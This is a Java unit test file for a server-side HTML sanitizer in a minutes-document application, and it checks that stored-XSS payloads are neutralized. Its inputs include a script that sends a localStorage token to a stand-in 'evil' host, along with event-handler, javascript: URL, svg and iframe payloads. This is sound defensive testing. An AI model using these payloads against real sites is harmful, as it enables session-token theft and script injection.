package com.empresa.actas.security;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SEC-001: el sanitizador server-side neutraliza payloads XSS almacenado
 * sobre contenidoHtml y conserva HTML documental legitimo del acta.
 */
class HtmlSanitizadorServiceTest {

    private final HtmlSanitizadorService sanitizador = new HtmlSanitizadorService();

    private void neutraliza(String payload) {
        String salida = sanitizador.sanitizarHtml(payload);
        assertFalse(salida.contains("<script"),
                "payload no neutralizado: " + payload + " -> " + salida);
        assertFalse(salida.contains("onerror")
                        || salida.contains("onload")
                        || salida.contains("onclick")
                        || salida.contains("javascript:")
                        || salida.contains("<iframe")
                        || salida.contains("<svg"),
                "markup activo sobrevivio: " + payload + " -> " + salida);
    }

    @Test
    void roboJwtViaScriptEsNeutralizado() {
        neutraliza("<script>fetch('http://evil/?c='+localStorage.token)</script>");
    }

    @Test
    void handlersDeEventoYUrlsJavascriptSonNeutralizados() {
        neutraliza("<img src=x onerror=alert(1)>");
        neutraliza("<a href=\"javascript:alert(1)\">click</a>");
        neutraliza("<p onclick=\"alert(1)\">hola</p>");
        neutraliza("<svg/onload=alert(1)>");
        neutraliza("<iframe src=\"http://evil\"></iframe>");
    }

    @Test
    void htmlDocumentalLegitimoSeConserva() {
        String salida = sanitizador.sanitizarHtml(
                "<p>Acta</p><table><tr><th>Col</th></tr><tr><td>Dato</td></tr></table>");
        assertTrue(salida.contains("<table>"), "la tabla documental debe conservarse");
        assertTrue(salida.contains("<td>Dato</td>"), "el contenido de la tabla debe conservarse");
    }

    @Test
    void nullYVacioPasanSinCambios() {
        org.junit.jupiter.api.Assertions.assertNull(sanitizador.sanitizarHtml(null));
        org.junit.jupiter.api.Assertions.assertEquals("", sanitizador.sanitizarHtml(""));
    }
}